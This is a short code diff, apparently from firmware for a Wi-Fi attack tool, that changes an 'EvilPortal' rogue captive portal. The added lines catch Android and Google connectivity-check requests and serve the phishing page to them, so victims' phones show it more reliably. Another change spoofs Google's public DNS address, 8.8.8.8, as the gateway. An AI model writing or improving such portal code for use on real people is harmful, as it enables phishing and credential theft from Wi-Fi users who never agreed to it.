@@ -81,6 +81,19 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         return;
     }
 
+    if (url.indexOf("generate_204") != -1 ||
+        url.indexOf("gen_204") != -1 ||
+        url.indexOf("connectivitycheck") != -1 ||
+        url.indexOf("clients3.google") != -1) {
+    
+        recordPageView();
+        if (isDefaultHtml)
+            request->send(200, "text/html", htmlPage);
+        else
+            request->send(*fsHtmlFile, htmlFileName, "text/html");
+        return;
+    }
+
     // iOS / macOS — also prefer 200 with the real page
     if (url == "/hotspot-detect.html" ||
         url == "/library/test/success.html" ||
@@ -174,7 +187,7 @@ bool EvilPortal::setup() {
                  apGateway = IPAddress(172, 0, 0, 1);
          }},
         {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1);     }},
-        {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1);   }},
+        {"8.8.8.8", [this]() { apGateway = IPAddress(8, 8, 8, 8);   }},
         {"192.168.0.1", [this]() { apGateway = IPAddress(192, 168, 0, 1);   }},
         {"10.0.0.1",    [this]() { apGateway = IPAddress(10, 0, 0, 1);      }},
         {"Custom",
